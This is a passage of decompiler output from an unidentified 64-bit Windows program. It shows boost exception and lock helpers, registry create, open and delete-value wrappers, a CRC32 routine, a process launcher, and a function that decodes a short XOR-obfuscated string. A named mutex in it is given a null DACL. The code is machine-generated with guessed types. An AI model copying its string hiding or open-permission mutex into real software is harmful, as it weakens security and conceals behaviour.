    (*(void (__cdecl **)(__int64, __int64))(*(_QWORD *)v3 + 24i64))(v3, v2);
  v7 = *(_QWORD *)(v1 + 16);
  v8 = *(_QWORD *)(v1 + 24);
  v9 = *(_DWORD *)(v1 + 32);
  v4 = &off_1400A5020;
  v5 = (void **)off_1400A5030;
  *(signed int **)((char *)&v11 + v11[1]) = (signed int *)&off_1400A5038;
  *(int *)((char *)&v10 + v11[1]) = 0;
  CxxThrowException(
    &v4,
    &_TI8_AV__clone_impl_U__error_info_injector_Ubad_year_gregorian_boost___exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);
// 1400A5020: using guessed type __int64 (__fastcall *off_1400A5020)(void *);
// 1400A5030: using guessed type __int64 (__fastcall *off_1400A5030[2])();
// 1400A5038: using guessed type __int64 (__fastcall *off_1400A5038)();
// 1400D38A8: using guessed type int _TI8_AV__clone_impl_U__error_info_injector_Ubad_year_gregorian_boost___exception_detail_boost___exception_detail_boost__;

//----- (000000014001D888) ----------------------------------------------------
void __fastcall __noreturn sub_14001D888(__int64 a1)
{
  sub_14001D8A0(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014001D8A0) ----------------------------------------------------
void __fastcall __noreturn sub_14001D8A0(__int64 a1)
{
  signed __int64 v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // rcx
  __int64 (__fastcall **v4)(void *); // [rsp+28h] [rbp-60h]
  void **v5; // [rsp+40h] [rbp-48h]
  __int64 v6; // [rsp+48h] [rbp-40h]
  __int64 v7; // [rsp+50h] [rbp-38h]
  __int64 v8; // [rsp+58h] [rbp-30h]
  int v9; // [rsp+60h] [rbp-28h]
  int v10; // [rsp+64h] [rbp-24h]
  signed int *v11; // [rsp+68h] [rbp-20h]
  void **v12; // [rsp+78h] [rbp-10h]

  v1 = a1 - 80;
  v11 = (signed int *)&unk_1400A4FD8;
  v12 = &off_1400A3CB8;
  std::exception::exception((std::exception *)&v4, (const struct std::exception *)(a1 - 80));
  v4 = (__int64 (__fastcall **)(void *))&loc_1400A3C88;
  if ( v1 )
    v1 += 24i64;
  v5 = &off_1400A3CB0;
  v3 = *(_QWORD *)(v1 + 8);
  v6 = v3;
  if ( v3 )
    (*(void (__cdecl **)(__int64, __int64))(*(_QWORD *)v3 + 24i64))(v3, v2);
  v7 = *(_QWORD *)(v1 + 16);
  v8 = *(_QWORD *)(v1 + 24);
  v9 = *(_DWORD *)(v1 + 32);
  v4 = &off_1400A4FA8;
  v5 = (void **)off_1400A4FB8;
  *(signed int **)((char *)&v11 + v11[1]) = (signed int *)&off_1400A4FC0;
  *(int *)((char *)&v10 + v11[1]) = 0;
  CxxThrowException(
    &v4,
    &_TI6_AV__clone_impl_U__error_info_injector_Vbad_alloc_std___exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4FA8: using guessed type __int64 (__fastcall *off_1400A4FA8)(void *);
// 1400A4FB8: using guessed type __int64 (__fastcall *off_1400A4FB8[2])();
// 1400A4FC0: using guessed type __int64 (__fastcall *off_1400A4FC0)();
// 1400D36F0: using guessed type int _TI6_AV__clone_impl_U__error_info_injector_Vbad_alloc_std___exception_detail_boost___exception_detail_boost__;

//----- (000000014001D988) ----------------------------------------------------
void __fastcall __noreturn sub_14001D988(__int64 a1)
{
  sub_14001D9A0(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014001D9A0) ----------------------------------------------------
void __fastcall __noreturn sub_14001D9A0(__int64 a1)
{
  signed __int64 v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // r8
  __int64 v4; // rcx
  __int64 (__fastcall **v5)(void *); // [rsp+30h] [rbp-49h]
  __int128 v6; // [rsp+48h] [rbp-31h]
  char Dst; // [rsp+58h] [rbp-21h]
  __int64 v8; // [rsp+68h] [rbp-11h]
  __int64 v9; // [rsp+70h] [rbp-9h]
  void **v10; // [rsp+78h] [rbp-1h]
  __int64 v11; // [rsp+80h] [rbp+7h]
  __int64 v12; // [rsp+88h] [rbp+Fh]
  __int64 v13; // [rsp+90h] [rbp+17h]
  int v14; // [rsp+98h] [rbp+1Fh]
  int v15; // [rsp+9Ch] [rbp+23h]
  signed int *v16; // [rsp+A0h] [rbp+27h]
  void **v17; // [rsp+B0h] [rbp+37h]

  v1 = a1 - 128;
  v16 = (signed int *)&unk_1400A5018;
  v17 = &off_1400A3CB8;
  std::exception::exception((std::exception *)&v5, (const struct std::exception *)(a1 - 128));
  v5 = (__int64 (__fastcall **)(void *))&loc_1400A3CD0;
  v6 = *(_OWORD *)(v1 + 24);
  v9 = 15i64;
  v8 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, (_QWORD *)(v1 + 40), 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v5 = (__int64 (__fastcall **)(void *))&loc_1400A3CD0;
  v10 = &off_1400A3CB0;
  v4 = *(_QWORD *)(v1 + 80);
  v11 = v4;
  if ( v4 )
    (*(void (__cdecl **)(__int64, __int64, __int64))(*(_QWORD *)v4 + 24i64))(v4, v2, v3);
  v12 = *(_QWORD *)(v1 + 88);
  v13 = *(_QWORD *)(v1 + 96);
  v14 = *(_DWORD *)(v1 + 104);
  v5 = &off_1400A4FE8;
  v10 = (void **)off_1400A4FF8;
  *(signed int **)((char *)&v16 + v16[1]) = (signed int *)&off_1400A5000;
  *(int *)((char *)&v15 + v16[1]) = 0;
  CxxThrowException(
    &v5,
    &_TI9_AV__clone_impl_U__error_info_injector_Vlock_error_boost___exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4FE8: using guessed type __int64 (__fastcall *off_1400A4FE8)(void *);
// 1400A4FF8: using guessed type __int64 (__fastcall *off_1400A4FF8[2])();
// 1400A5000: using guessed type __int64 (__fastcall *off_1400A5000)();
// 1400D37C0: using guessed type int _TI9_AV__clone_impl_U__error_info_injector_Vlock_error_boost___exception_detail_boost___exception_detail_boost__;

//----- (000000014001DAD0) ----------------------------------------------------
__int64 __fastcall sub_14001DAD0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(a1 + 120))(*(_QWORD *)(a1 + 128));
}

//----- (000000014001DAE0) ----------------------------------------------------
char __fastcall sub_14001DAE0(void **a1)
{
  char result; // al
  __int64 v2; // rcx
  const char *v3; // [rsp+20h] [rbp-88h]
  __int128 v4; // [rsp+28h] [rbp-80h]
  __int64 v5; // [rsp+38h] [rbp-70h]
  void *v6; // [rsp+40h] [rbp-68h]
  __int128 v7; // [rsp+58h] [rbp-50h]
  char v8; // [rsp+68h] [rbp-40h]
  __int64 v9; // [rsp+78h] [rbp-30h]
  __int64 v10; // [rsp+80h] [rbp-28h]

  v5 = -2i64;
  result = sub_140036990(a1);
  if ( !result )
  {
    LODWORD(v4) = 11;
    *((_QWORD *)&v4 + 1) = sub_140030C00(v2);
    v3 = "boost::thread_resource_error";
    std::exception::exception((std::exception *)&v6, &v3);
    v7 = v4;
    v10 = 15i64;
    v9 = 0i64;
    v8 = 0;
    v6 = &loc_1400A3CD0;
    sub_140010B60((const struct std::exception *)&v6);
  }
  return result;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);

//----- (000000014001DB90) ----------------------------------------------------
signed int __fastcall sub_14001DB90(volatile signed __int32 **a1)
{
  volatile signed __int32 **v1; // rbx
  volatile signed __int32 *v2; // rcx
  signed int result; // eax
  HANDLE v4; // rax
  __int128 v5; // [rsp+20h] [rbp-89h]
  __int128 v6; // [rsp+30h] [rbp-79h]
  __int64 v7; // [rsp+40h] [rbp-69h]
  void *v8; // [rsp+50h] [rbp-59h]
  __int128 v9; // [rsp+68h] [rbp-41h]
  char v10; // [rsp+78h] [rbp-31h]
  __int64 v11; // [rsp+88h] [rbp-21h]
  __int64 v12; // [rsp+90h] [rbp-19h]
  void *v13; // [rsp+A0h] [rbp-9h]
  __int128 v14; // [rsp+B8h] [rbp+Fh]
  char v15; // [rsp+C8h] [rbp+1Fh]
  __int64 v16; // [rsp+D8h] [rbp+2Fh]
  __int64 v17; // [rsp+E0h] [rbp+37h]

  v7 = -2i64;
  v1 = a1;
  v2 = *a1;
  if ( !v2 )
  {
    LODWORD(v6) = 1;
    *((_QWORD *)&v6 + 1) = sub_140030C00(0i64);
    *(_QWORD *)&v5 = "boost unique_lock has no mutex";
    std::exception::exception((std::exception *)&v8, (const char *const *)&v5);
    v9 = v6;
    v12 = 15i64;
    v11 = 0i64;
    v10 = 0;
    v8 = &loc_1400A3CD0;
    sub_140017380(&v8);
  }
  if ( !*((_BYTE *)v1 + 8) )
  {
    LODWORD(v5) = 1;
    *((_QWORD *)&v5 + 1) = sub_140030C00(v2);
    *(_QWORD *)&v6 = "boost unique_lock doesn't own the mutex";
    std::exception::exception((std::exception *)&v13, (const char *const *)&v6);
    v14 = v5;
    v17 = 15i64;
    v16 = 0i64;
    v15 = 0;
    v13 = &loc_1400A3CD0;
    sub_140017380(&v13);
  }
  result = _InterlockedExchangeAdd(v2, 0x80000000);
  if ( !_bittest(&result, 0x1Eu) && result > (signed int)2147483648 && !_interlockedbittestandset(v2, 0x1Eu) )
  {
    v4 = sub_1400139E0((__int64)v2);
    result = SetEvent(v4);
  }
  *((_BYTE *)v1 + 8) = 0;
  return result;
}
// 140017380: using guessed type __int64 __fastcall sub_140017380(_QWORD);
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);

//----- (000000014001DCE0) ----------------------------------------------------
char __fastcall sub_14001DCE0(HKEY a1, const CHAR *a2, char a3)
{
  LSTATUS v3; // eax
  HKEY phkResult; // [rsp+78h] [rbp+20h]

  phkResult = 0i64;
  if ( a3 )
  {
    if ( *((_QWORD *)a2 + 3) >= 0x10ui64 )
      a2 = *(const CHAR **)a2;
    v3 = RegCreateKeyExA(a1, a2, 0, 0i64, 0, 0x20106u, 0i64, &phkResult, 0i64);
  }
  else
  {
    if ( *((_QWORD *)a2 + 3) >= 0x10ui64 )
      a2 = *(const CHAR **)a2;
    v3 = RegCreateKeyA(a1, a2, &phkResult);
  }
  if ( v3 )
    return 0;
  RegCloseKey(phkResult);
  return 1;
}

//----- (000000014001DD60) ----------------------------------------------------
bool __fastcall sub_14001DD60(HKEY a1, const CHAR *a2, const CHAR *a3, char a4)
{
  const CHAR *v4; // rbx
  REGSAM v5; // eax
  LSTATUS v6; // eax
  LSTATUS v8; // ebx
  HKEY hKey; // [rsp+48h] [rbp+10h]

  v4 = a3;
  v5 = 2;
  hKey = 0i64;
  if ( a4 )
    v5 = 256;
  if ( *((_QWORD *)a2 + 3) >= 0x10ui64 )
    a2 = *(const CHAR **)a2;
  v6 = RegOpenKeyExA(a1, a2, 0, v5, &hKey);
  if ( v6 == 2 )
    return 1;
  if ( v6 )
    return 0;
  if ( *((_QWORD *)v4 + 3) >= 0x10ui64 )
    v4 = *(const CHAR **)v4;
  v8 = RegDeleteValueA(hKey, v4);
  RegCloseKey(hKey);
  return (v8 & 0xFFFFFFFD) == 0;
}

//----- (000000014001DE10) ----------------------------------------------------
char __fastcall sub_14001DE10(HKEY a1, const CHAR *a2, char a3)
{
  REGSAM v3; // er9
  bool v4; // cf
  HKEY hKey; // [rsp+48h] [rbp+10h]

  v3 = 131097;
  if ( a3 )
    v3 = 131353;
  v4 = *((_QWORD *)a2 + 3) < 0x10ui64;
  hKey = 0i64;
  if ( !v4 )
    a2 = *(const CHAR **)a2;
  if ( RegOpenKeyExA(a1, a2, 0, v3, &hKey) )
    return 0;
  RegCloseKey(hKey);
  return 1;
}

//----- (000000014001DE70) ----------------------------------------------------
_QWORD *__fastcall sub_14001DE70(_QWORD *a1, size_t *a2, size_t *a3)
{
  size_t *v3; // r11
  size_t v4; // rdx
  size_t *v5; // r10
  size_t v6; // r8
  _QWORD *v7; // rbx
  _QWORD *v8; // rax

  v3 = a2;
  v4 = a2[2];
  v5 = a3;
  v6 = a3[2];
  v7 = a1;
  if ( v6 <= v3[3] - v4 || v5[3] - v6 < v4 )
    v8 = sub_140004B80(v3, v5, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  else
    v8 = sub_14001E3C0(v5, 0i64, v3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  sub_140003CB0(v7, v8);
  return v7;
}

//----- (000000014001DEF0) ----------------------------------------------------
_DWORD *__fastcall sub_14001DEF0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _DWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _DWORD *v6; // rax
  bool v7; // cf
  _DWORD *v8; // rax
  __int64 v9; // rdx
  _DWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9F00;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9F00 & 1 )
  {
    v5 = byte_1400D9EFC;
  }
  else
  {
    v4 = 69069 * dword_1400D9EF4 + 1234567;
    v1 = dword_1400D9F00 | 1;
    dword_1400D9EF4 = v4;
    dword_1400D9F00 |= 1u;
    dword_1400D9EEC = HIWORD(dword_1400D9EEC) + 36969 * (unsigned __int16)dword_1400D9EEC;
    LOBYTE(v4) = (BYTE2(dword_1400D9EF8) + 80 * dword_1400D9EF8) ^ v4;
    dword_1400D9EF8 = HIWORD(dword_1400D9EF8) + 18000 * (unsigned __int16)dword_1400D9EF8;
    v5 = (((unsigned int)dword_1400D9EF0 >> 13) ^ 32 * dword_1400D9EF0 ^ dword_1400D9EF0) + v4;
    dword_1400D9EF0 ^= ((unsigned int)dword_1400D9EF0 >> 13) ^ 32 * (dword_1400D9EF0 ^ (dword_1400D9EF0 << 12));
    byte_1400D9EFC = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9F00 = v1 | 2;
    byte_1400D9F04[0] = v5 ^ 0x57;
    byte_1400D9F05 = (v5 - 1) ^ 0x53;
    byte_1400D9F06 = (v5 - 2) ^ 0x5F;
    byte_1400D9F07 = (v5 - 3) ^ 0x4E;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 4ui64 )
  {
    sub_140004790(Src, 4ui64, 0i64);
    v5 = byte_1400D9EFC;
  }
  if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
    v6 = v3;
  else
    v6 = *(_DWORD **)v3;
  *v6 = 0;
  v7 = *((_QWORD *)v3 + 3) < 0x10ui64;
  *((_QWORD *)v3 + 2) = 4i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = *(_DWORD **)v3;
  *((_BYTE *)v8 + 4) = 0;
  v9 = 0i64;
  do
  {
    if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
      v10 = v3;
    else
      v10 = *(_DWORD **)v3;
    v11 = byte_1400D9F04[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 4 );
  return v3;
}
// 1400D9EEC: using guessed type int dword_1400D9EEC;
// 1400D9EF0: using guessed type int dword_1400D9EF0;
// 1400D9EF4: using guessed type int dword_1400D9EF4;
// 1400D9EF8: using guessed type int dword_1400D9EF8;
// 1400D9EFC: using guessed type char byte_1400D9EFC;
// 1400D9F00: using guessed type int dword_1400D9F00;
// 1400D9F05: using guessed type char byte_1400D9F05;
// 1400D9F06: using guessed type char byte_1400D9F06;
// 1400D9F07: using guessed type char byte_1400D9F07;

//----- (000000014001E090) ----------------------------------------------------
_QWORD *__fastcall sub_14001E090(void *Dst, _QWORD *a2)
{
  size_t v2; // rdi
  signed __int64 v3; // rsi
  _QWORD *v4; // r14
  unsigned int v5; // ebx
  unsigned __int64 v6; // r9
  unsigned int v7; // er8
  unsigned int v8; // er8
  __int64 v9; // rax
  char *v10; // rax
  char *v11; // rdx
  signed __int64 v12; // r8
  unsigned __int64 v13; // rcx
  char Dest[8]; // [rsp+28h] [rbp-20h]
  int v16; // [rsp+30h] [rbp-18h]

  v2 = 0i64;
  v3 = (signed __int64)a2;
  v4 = Dst;
  v5 = 0;
  v6 = 0i64;
  v7 = -1;
  do
  {
    if ( v7 & 1 )
      v5 |= 1 << (31 - v6);
    v8 = v7 >> 1;
    if ( v8 & 1 )
      v5 |= 1 << (30 - v6);
    v6 += 2i64;
    v7 = v8 >> 1;
  }
  while ( v6 < 0x20 );
  sub_14001E2C0();
  v9 = *(_QWORD *)(v3 + 16);
  if ( *(_QWORD *)(v3 + 24) >= 0x10ui64 )
    v3 = *(_QWORD *)v3;
  v10 = (char *)(v3 + v9);
  v11 = &v10[-v3];
  if ( v3 > (unsigned __int64)v10 )
    v11 = 0i64;
  if ( v11 )
  {
    v12 = -v3;
    do
    {
      v13 = *(unsigned __int8 *)v3++;
      v5 = (v5 >> 8) ^ dword_1400D9F10[(unsigned __int8)v5 ^ v13];
    }
    while ( v12 + v3 < (unsigned __int64)v11 );
  }
  *(_QWORD *)Dest = 0i64;
  v16 = 0;
  sprintf(Dest, "%08X", ~v5);
  v4[3] = 15i64;
  v4[2] = 0i64;
  *(_BYTE *)v4 = 0;
  if ( Dest[0] )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( Dest[v2] );
  }
  sub_140004F20(v4, Dest, v2);
  return v4;
}

//----- (000000014001E200) ----------------------------------------------------
_QWORD *__fastcall sub_14001E200(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rdi
  size_t *v3; // rbx
  size_t *v4; // rax
  void *Src; // [rsp+30h] [rbp-58h]
  __int64 v7; // [rsp+40h] [rbp-48h]
  unsigned __int64 v8; // [rsp+48h] [rbp-40h]
  void *Dst; // [rsp+50h] [rbp-38h]
  unsigned __int64 v10; // [rsp+68h] [rbp-20h]

  v2 = a1;
  v3 = sub_14001E090(&Dst, a2);
  v4 = (size_t *)sub_14001DEF0(&Src);
  sub_14001DE70(v2, v4, v3);
  if ( v8 >= 0x10 )
    operator delete(Src);
  v8 = 15i64;
  v7 = 0i64;
  LOBYTE(Src) = 0;
  if ( v10 >= 0x10 )
    operator delete(Dst);
  return v2;
}

//----- (000000014001E2C0) ----------------------------------------------------
void sub_14001E2C0()
{
  unsigned __int8 v0; // r10
  int v1; // eax
  unsigned __int8 v2; // cl
  int v3; // er9
  unsigned __int64 v4; // r8
  unsigned int v5; // eax
  unsigned __int8 v6; // al

  if ( !byte_1400DA310 )
  {
    v0 = 0;
    do
    {
      v1 = 0;
      v2 = -128;
      do
      {
        if ( v2 & v0 )
          v1 ^= 0x80000000;
        if ( v1 >= 0 )
          v1 *= 2;
        else
          v1 = 2 * v1 ^ 0x4C11DB7;
        v2 >>= 1;
      }
      while ( v2 );
      v3 = 0;
      v4 = 0i64;
      do
      {
        if ( v1 & 1 )
          v3 |= 1 << (31 - v4);
        v5 = (unsigned int)v1 >> 1;
        if ( v5 & 1 )
          v3 |= 1 << (30 - v4);
        v4 += 2i64;
        v1 = v5 >> 1;
      }
      while ( v4 < 0x20 );
      v6 = 0;
      if ( v0 & 1 )
        v6 = -128;
      if ( (v0 >> 1) & 1 )
        v6 |= 0x40u;
      if ( (v0 >> 2) & 1 )
        v6 |= 0x20u;
      if ( (v0 >> 3) & 1 )
        v6 |= 0x10u;
      if ( (v0 >> 4) & 1 )
        v6 |= 8u;
      if ( (v0 >> 5) & 1 )
        v6 |= 4u;
      if ( (v0 >> 6) & 1 )
        v6 |= 2u;
      if ( (v0 >> 6) & 2 )
        v6 |= 1u;
      dword_1400D9F10[v6] = v3;
      ++v0;
    }
    while ( v0 );
    byte_1400DA310 = 1;
  }
}
// 1400DA310: using guessed type char byte_1400DA310;

//----- (000000014001E3C0) ----------------------------------------------------
size_t *__fastcall sub_14001E3C0(size_t *a1, size_t a2, size_t *a3, unsigned __int64 a4, size_t a5)
{
  size_t *v5; // rbx
  size_t v6; // rcx
  unsigned __int64 v7; // r14
  size_t *v8; // rsi
  unsigned __int64 v9; // rbp
  unsigned __int64 v10; // rax
  size_t v11; // rax
  size_t v12; // rdi
  size_t v13; // r15
  unsigned __int64 v14; // rax
  size_t v15; // rcx
  size_t v16; // rax
  unsigned __int64 v17; // rax
  size_t v18; // rcx
  size_t v19; // rax
  size_t v20; // rax
  bool v21; // cf
  size_t v22; // rax

  v5 = a1;
  v6 = a1[2];
  v7 = a4;
  v8 = a3;
  v9 = a2;
  if ( v6 < a2 || (v10 = a3[2], v10 < a4) )
  {
    std::_Xout_of_range("invalid string position");
    JUMPOUT(*(_QWORD *)&byte_14001E536);
  }
  v11 = v10 - a4;
  v12 = a5;
  if ( v11 < a5 )
    v12 = v11;
  if ( -1i64 - v6 <= v12 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  if ( v12 )
  {
    v13 = v6 + v12;
    if ( sub_1400049C0(v5, v6 + v12, 0) )
    {
      v14 = v5[3];
      if ( v14 < 0x10 )
        v15 = (size_t)v5;
      else
        v15 = *v5;
      if ( v14 < 0x10 )
        v16 = (size_t)v5;
      else
        v16 = *v5;
      if ( v5[2] != v9 )
        memmove((void *)(v12 + v16 + v9), (const void *)(v15 + v9), v5[2] - v9);
      if ( v5 == v8 )
      {
        if ( v9 < v7 )
          v7 += v12;
        v17 = v5[3];
        if ( v17 < 0x10 )
          v18 = (size_t)v5;
        else
          v18 = *v5;
        if ( v17 < 0x10 )
          v19 = (size_t)v5;
        else
          v19 = *v5;
        if ( v12 )
          memmove((void *)(v19 + v9), (const void *)(v18 + v7), v12);
      }
      else
      {
        if ( v8[3] >= 0x10 )
          v8 = (size_t *)*v8;
        if ( v5[3] < 0x10 )
          v20 = (size_t)v5;
        else
          v20 = *v5;
        if ( v12 )
          memcpy((void *)(v20 + v9), (char *)v8 + v7, v12);
      }
      v21 = v5[3] < 0x10;
      v5[2] = v13;
      if ( v21 )
        v22 = (size_t)v5;
      else
        v22 = *v5;
      *(_BYTE *)(v22 + v13) = 0;
    }
  }
  return v5;
}
// 14001E536: using guessed type char;
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014001E540) ----------------------------------------------------
bool __fastcall sub_14001E540(LPCSTR lpApplicationName, char *Src)
{
  char *v2; // rbx
  const char *v3; // rsi
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+50h] [rbp-2B8h]
  int Dst; // [rsp+70h] [rbp-298h]
  int v7; // [rsp+ACh] [rbp-25Ch]
  __int16 v8; // [rsp+B0h] [rbp-258h]
  CHAR CommandLine; // [rsp+E0h] [rbp-228h]

  v2 = Src;
  v3 = lpApplicationName;
  memset(&Dst, 0, 0x68ui64);
  Dst = 104;
  v7 = 1;
  *(_OWORD *)&ProcessInformation.hProcess = 0ui64;
  v8 = 0;
  *(_QWORD *)&ProcessInformation.dwProcessId = 0i64;
  memset(&CommandLine, 0, 0x208ui64);
  strncpy_s(&CommandLine, 0x208ui64, "\"", 0xFFFFFFFFFFFFFFFFui64);
  strncat_s(&CommandLine, 0x208ui64, v3, 0xFFFFFFFFFFFFFFFFui64);
  strncat_s(&CommandLine, 0x208ui64, "\" ", 0xFFFFFFFFFFFFFFFFui64);
  strncat_s(&CommandLine, 0x208ui64, v2, 0xFFFFFFFFFFFFFFFFui64);
  LODWORD(v2) = CreateProcessA(
                  v3,
                  &CommandLine,
                  0i64,
                  0i64,
                  0,
                  0,
                  0i64,
                  0i64,
                  (LPSTARTUPINFOA)&Dst,
                  &ProcessInformation);
  CloseHandle(ProcessInformation.hProcess);
  CloseHandle(ProcessInformation.hThread);
  return (_DWORD)v2 != 0;
}

//----- (000000014001E790) ----------------------------------------------------
void __fastcall sub_14001E790(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  if ( *(_QWORD *)(a1 + 32) )
  {
    if ( sub_14001E800((LPCSTR)a1) )
      ReleaseMutex(*(HANDLE *)(v1 + 32));
    CloseHandle(*(HANDLE *)(v1 + 32));
  }
  if ( *(_QWORD *)(v1 + 24) >= 0x10ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 15i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_BYTE *)v1 = 0;
}

//----- (000000014001E800) ----------------------------------------------------
bool __fastcall sub_14001E800(LPCSTR lpName)
{
  CHAR *v1; // rsi
  LPCSTR v2; // rbx
  bool v3; // zf
  bool v4; // cf
  HANDLE v5; // rax
  struct _SECURITY_ATTRIBUTES MutexAttributes; // [rsp+20h] [rbp-48h]
  char pSecurityDescriptor; // [rsp+38h] [rbp-30h]
  __int64 v9; // [rsp+39h] [rbp-2Fh]
  __int64 v10; // [rsp+41h] [rbp-27h]
  __int64 v11; // [rsp+49h] [rbp-1Fh]
  __int64 v12; // [rsp+51h] [rbp-17h]
  int v13; // [rsp+59h] [rbp-Fh]
  __int16 v14; // [rsp+5Dh] [rbp-Bh]
  char v15; // [rsp+5Fh] [rbp-9h]

  v1 = (CHAR *)(lpName + 32);
  v2 = lpName;
  v3 = *((_QWORD *)lpName + 4) == 0i64;
  if ( !*((_QWORD *)lpName + 4) )
  {
    MutexAttributes.nLength = 0;
    pSecurityDescriptor = 0;
    v9 = 0i64;
    v10 = 0i64;
    v11 = 0i64;
    v12 = 0i64;
    v13 = 0;
    v14 = 0;
    v15 = 0;
    MutexAttributes.lpSecurityDescriptor = 0i64;
    *(_QWORD *)&MutexAttributes.bInheritHandle = 0i64;
    InitializeSecurityDescriptor(&pSecurityDescriptor, 1u);
    SetSecurityDescriptorDacl(&pSecurityDescriptor, 1, 0i64, 0);
    v4 = *((_QWORD *)v2 + 3) < 0x10ui64;
    MutexAttributes.lpSecurityDescriptor = &pSecurityDescriptor;
    MutexAttributes.nLength = 24;
    MutexAttributes.bInheritHandle = 0;
    if ( !v4 )
      v2 = *(LPCSTR *)v2;
    v5 = CreateMutexA(&MutexAttributes, 0, v2);
    *(_QWORD *)v1 = v5;
    v3 = v5 == 0i64;
  }
  return !v3;
}

//----- (000000014001E8C0) ----------------------------------------------------
bool __fastcall sub_14001E8C0(const CHAR *a1)
{
  const CHAR *v1; // rbx
  bool result; // al

  v1 = a1;
  if ( sub_14001E800(a1) )
    result = WaitForSingleObject(*((HANDLE *)v1 + 4), 1u) == 0;
  else
    result = 0;
  return result;
}

//----- (000000014001E900) ----------------------------------------------------
bool __fastcall sub_14001E900(const CHAR *a1)
{
  const CHAR *v1; // rbx
  bool result; // al

  v1 = a1;
  result = sub_14001E800(a1);
  if ( result )
    result = ReleaseMutex(*((HANDLE *)v1 + 4));
  return result;
}

//----- (000000014001EA10) ----------------------------------------------------
_QWORD *__fastcall sub_14001EA10(_QWORD *a1, __int64 a2, _QWORD **a3)
{
  _QWORD **v3; // rsi
  _QWORD *v4; // rax
  _QWORD *v5; // rdi
  signed __int64 v6; // rbx
  __int64 v7; // rax

  v3 = a3;
  v4 = sub_140021680(a1);
  v5 = v4;
  *((_WORD *)v4 + 12) = 0;
  v6 = (signed __int64)(v4 + 4);
  if ( v4 != (_QWORD *)-32i64 )
  {
    sub_140003CB0(v4 + 4, *v3);
    *(_QWORD *)(v6 + 32) = 0i64;
    *(_QWORD *)(v6 + 40) = 0i64;
    sub_1400215D0();
    *(_QWORD *)(v6 + 32) = v7;
  }
  return v5;
}

//----- (000000014001EA90) ----------------------------------------------------
__int64 __fastcall sub_14001EA90(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdi
  __int64 v5; // rbx

  v4 = a4;
  v5 = sub_140021620(a1, a2, a3);
  if ( v5 != -16 )
    sub_14001E930(v5 + 16, v4);
  return v5;
}
// 14001E930: using guessed type __int64 __fastcall sub_14001E930(_QWORD, _QWORD);
// 140021620: using guessed type __int64 __fastcall sub_140021620(_QWORD, _QWORD, _QWORD);

//----- (000000014001EAE0) ----------------------------------------------------
_QWORD *__fastcall sub_14001EAE0(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rdi
  _QWORD *v3; // rax
  _QWORD *v4; // rsi
  signed __int64 v5; // rbx

  v2 = a2;
  v3 = sub_1400216E0(a1);
  v4 = v3;
  *((_WORD *)v3 + 12) = 0;
  v5 = (signed __int64)(v3 + 4);
  if ( v3 != (_QWORD *)-32i64 )
  {
    v3[7] = 15i64;
    v3[6] = 0i64;
    *(_BYTE *)v5 = 0;
    if ( v2[3] >= 0x10ui64 )
    {
      *(_QWORD *)v5 = *v2;
      *v2 = 0i64;
    }
    else if ( v2[2] != -1i64 )
    {
      memmove(v3 + 4, v2, v2[2] + 1i64);
    }
    *(_QWORD *)(v5 + 16) = v2[2];
    *(_QWORD *)(v5 + 24) = v2[3];
    v2[3] = 15i64;
    v2[2] = 0i64;
    *(_BYTE *)v2 = 0;
  }
  return v4;
}

//----- (000000014001EBA0) ----------------------------------------------------
